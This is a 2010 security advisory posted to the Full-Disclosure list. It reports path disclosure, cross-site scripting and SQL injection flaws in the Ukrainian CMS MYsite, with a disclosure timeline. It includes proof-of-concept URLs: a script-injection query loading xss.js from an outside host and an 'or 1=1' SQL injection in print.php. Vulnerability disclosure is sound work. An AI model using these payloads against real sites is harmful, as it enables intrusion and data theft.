Subject: Vulnerabilities in CMS MYsite

Hello Full-Disclosure!

I want to warn you about Full path disclosure, Cross-Site Scripting and SQL
Injection vulnerabilities in CMS MYsite. It's Ukrainian commercial CMS.

Full path disclosure (WASC-13):

http://site/portal/modules.php?name=Ads

XSS (WASC-08):

http://site/portal/modules.php?name=Web_Links&l_op=search&query=%3Cscript%20src=http://websecurity.com.ua/webtools/xss.js%20

SQL Injection (WASC-19):

http://site/print.php?id=1&pid=-1%20or%201=1

Affected products:

All versions of CMS MYsite before last one where vulnerabilities were fixed
(mostly).

Timeline:

2010.06.29 - announced at my site and later informed developers of CMS.
Developers quickly answered that they'd look at them.
2010.09.25 - disclosed at my site. Developers didn't inform me when they
fixed the holes, but today I found that they already fixed holes (at least
at their own site). But I note, that even XSS is fixed, but not efficiently,
so at turned off mq at the site it's possible to conduct XSS attack,
particularly with using of MouseOverJacking.

I mentioned about these vulnerabilities at my site
(http://websecurity.com.ua/4330/).

Best wishes & regards,
MustLive
